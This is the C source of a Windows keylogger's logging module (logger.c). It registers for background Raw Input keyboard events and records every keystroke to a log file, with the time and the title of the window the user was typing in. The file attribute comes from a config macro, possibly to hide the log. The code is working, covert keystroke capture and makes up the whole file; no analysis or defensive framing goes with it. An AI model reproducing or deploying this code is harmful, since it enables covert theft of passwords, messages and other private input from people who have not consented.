/*
 * logger.c
 * contains routines to hook the keyboard.
 * (uses Raw Input)
 */

#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <commctrl.h>
#include <tchar.h>
#include "../config.h"


BOOL register_rawidev(char *log_file_path, HWND h_wnd);
BOOL raw_idev_handler(LPARAM l_param);
void write_to_log(UINT vkey_code);
void flush_buffers();
void fin();


char active_window_title[MAX_PATH]={'\0'};			/* Holds the title of the currently active window */
char prev_window_title[MAX_PATH]={'\0'};			/* Holds the title of the previously active window */
HWND h_active_window;								/* handle to current active window */
HWND h_prev_window;									/* handle to previously active window */
SYSTEMTIME curr_time;								/* Stores current LocalTime */
SYSTEMTIME prev_time={ 0 };							/* Stores time of last keyboard message */
char window_title[MAX_PATH+64];						/* Formatted title to write to file */
HANDLE h_logfile;									/* handle to log file */



/* Register window to receive RawInput messages */
BOOL register_rawidev(char *log_file_path, HWND h_wnd){
	
	RAWINPUTDEVICE raw_idev;
	
	/* 
	 * Setup RawInput shizznet 
	 * http://msdn.microsoft.com/en-us/library/windows/desktop/ms645546(v=vs.85).aspx
	 * http://msdn.microsoft.com/en-us/library/windows/desktop/ms645565(v=vs.85).aspx
	 * http://msdn.microsoft.com/en-us/library/windows/desktop/ms645562(v=vs.85).aspx
	 */
	raw_idev.usUsagePage = 0x01;
	raw_idev.usUsage = 0x06;
	raw_idev.dwFlags = RIDEV_INPUTSINK | RIDEV_NOLEGACY;
	raw_idev.hwndTarget = h_wnd;
	
	if (RegisterRawInputDevices(&raw_idev, 1, sizeof(raw_idev)) == FALSE)
		return FALSE;
	
	
	/* Open log file for output */
	h_logfile = CreateFile(	log_file_path, 
								GENERIC_WRITE, 
								FILE_SHARE_READ, 
								NULL, 
								OPEN_ALWAYS, 
								LOGFILEATTR,
								NULL);
	
	if(h_logfile == INVALID_HANDLE_VALUE)
		return FALSE;
	
	SetFilePointer(h_logfile, 0, NULL, FILE_END);
	
	return TRUE;
}



BOOL raw_idev_handler(LPARAM l_param){
	
	RAWINPUT *raw_buf;
	UINT cb_size;
	
	/* get the size of the RAWINPUT structure returned */
	GetRawInputData((HRAWINPUT)l_param, 
					RID_INPUT, 
					NULL, 
					&cb_size,
					sizeof(RAWINPUTHEADER)
					);
	
	/* allocate memory RAWINPUT structure */
	raw_buf = (PRAWINPUT)malloc(cb_size);
	if(!raw_buf)
		return FALSE;
	
	/* finally, get the raw input */
	if( GetRawInputData((HRAWINPUT)l_param, 
						RID_INPUT, 
						raw_buf, 
						&cb_size,
						sizeof(RAWINPUTHEADER)) ){
		
		/* log key if the originating device is keyboard */
		if( raw_buf->header.dwType == RIM_TYPEKEYBOARD  
			&& ( raw_buf->data.keyboard.Message == WM_KEYDOWN || raw_buf->data.keyboard.Message == WM_SYSKEYDOWN ) )
			write_to_log( raw_buf->data.keyboard.VKey );
	}	
	
	free(raw_buf);
	return TRUE;
}



/* write formatted kkeycodes to logfile */
void write_to_log(UINT vkey_code){
	
	DWORD n;
	BYTE lpKeyState[256];				/* For use by ToAscii and GetKeyboardState */
	char key_name[16];					/* String to hold key name */
	int key_name_size;					/* Length of key name */
	WORD w_buffer;
	short int is_shift = 0;				/* Variable to decide if current scanned char should be in caps. */
	
	if(!h_logfile)
		return;
	
	/* Get Current Time */
	GetLocalTime(&curr_time);

	/* Check currently active window and grab title */
	h_active_window = GetForegroundWindow();
	GetWindowText(h_active_window, active_window_title, MAX_PATH);
	
	/* Write new title to logfile if:
	 * 1)current window title is not equal to previous window title
	 * 2)last log write was not in last minute
	 * 3)window handle of active window is different from previous handle
	 */
	if(strcmp(active_window_title, prev_window_title)
			||(curr_time.wMinute != prev_time.wMinute)
			||(h_active_window != h_prev_window)){
			
		strcpy(prev_window_title, active_window_title);
		prev_time = curr_time;
		h_prev_window = h_active_window;
		sprintf(window_title, "\r\n[ (%d/%d/%d %d:%d) TITLE: %s ]\r\n", 
					curr_time.wMonth, curr_time.wDay, curr_time.wYear,
					curr_time.wHour, curr_time.wMinute,
					active_window_title);
		
		WriteFile(h_logfile, window_title, strlen(window_title), &n, NULL);
	}

	/* Parse and write keys to log */
	if( (w_buffer = MapVirtualKey(vkey_code, MAPVK_VK_TO_CHAR)) && (w_buffer >= 32 && w_buffer <= 126) ){
	
		GetKeyboardState(lpKeyState);
		ToAscii( vkey_code, MapVirtualKey(vkey_code, 0), lpKeyState, &w_buffer, 0 );
		WriteFile(h_logfile, (char *)&w_buffer, 1, &n, NULL);
	
	}else{
	
		key_name[0] = '[';
		key_name_size = GetKeyNameText( MAKELONG(0, MapVirtualKey(vkey_code, MAPVK_VK_TO_VSC) ), key_name+1, sizeof(key_name)-2);
		key_name[key_name_size+1] = ']';
		WriteFile(h_logfile, key_name, key_name_size+2, &n, NULL);
		
	}
	
	FlushFileBuffers(h_logfile);
}



void flush_buffers(){
	if(h_logfile)
		FlushFileBuffers(h_logfile);
}


void fin(){
	if(h_logfile)
		CloseHandle(h_logfile);
}


